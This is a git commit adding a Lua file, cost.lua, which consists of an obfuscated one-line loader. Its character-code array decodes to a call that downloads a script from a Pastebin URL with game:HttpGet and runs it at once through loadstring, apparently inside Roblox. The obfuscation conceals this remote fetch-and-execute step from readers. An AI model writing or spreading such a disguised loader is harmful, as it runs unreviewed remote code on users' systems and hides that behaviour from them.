fc2e72790bdad64489b0c3df3b10b49b714ecdb9
alpa <101903606+pokdd@users.noreply.github.com>
2022-07-12 03:30:27 +0200

    Rename cost to cost.lua

---
+++ cost.lua
@@ -0,0 +1,5 @@
+--[[
+	ALPA
+--]]
+
+SGTSOBF_AAaaAaaAA={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\34","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\82","\107","\83","\77","\56","\120","\122","\87","\34","\41","\41","\40","\41",}SGTSOBF_LLLlllLLL="";for _,SGTSOBF_ttTTttTtt in pairs(SGTSOBF_AAaaAaaAA)do SGTSOBF_LLLlllLLL=SGTSOBF_LLLlllLLL..SGTSOBF_ttTTttTtt;end;SGTSOBF_JjJjjjJjJ=function(SGTSOBF_iIIiIiiii)loadstring(SGTSOBF_iIIiIiiii)()end;SGTSOBF_JjJjjjJjJ(SGTSOBF_LLLlllLLL)
